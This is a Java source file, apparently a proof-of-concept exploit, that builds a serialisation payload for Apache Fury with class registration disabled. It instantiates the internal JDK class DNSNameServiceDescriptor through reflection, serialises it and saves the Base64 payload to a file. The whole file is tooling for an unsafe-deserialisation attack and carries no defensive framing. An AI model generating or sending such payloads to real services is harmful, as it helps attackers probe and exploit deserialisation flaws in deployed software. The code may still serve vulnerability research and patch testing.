
import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.util.Base64;

public class ExpDNS {
    public static void main(String[] args) throws Exception {
        System.out.println("Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...");

        Fury fury = Fury.builder()
            .withLanguage(Language.JAVA)
            .requireClassRegistration(false)
            .build();

        // Load the class via reflection to avoid compilation errors if access is restricted
        Class<?> clazz = Class.forName("sun.net.spi.nameservice.dns.DNSNameServiceDescriptor");
        Constructor constructor = clazz.getDeclaredConstructor();
        Object instance = constructor.newInstance();

        byte[] payload = fury.serialize(instance);
        String b64 = Base64.getEncoder().encodeToString(payload);

        try (FileOutputStream fos = new FileOutputStream("payload_dns.b64")) {
            fos.write(b64.getBytes());
        }

        System.out.println("Payload saved to payload_dns.b64");
        System.out.println("Payload Base64: " + b64);
    }
}
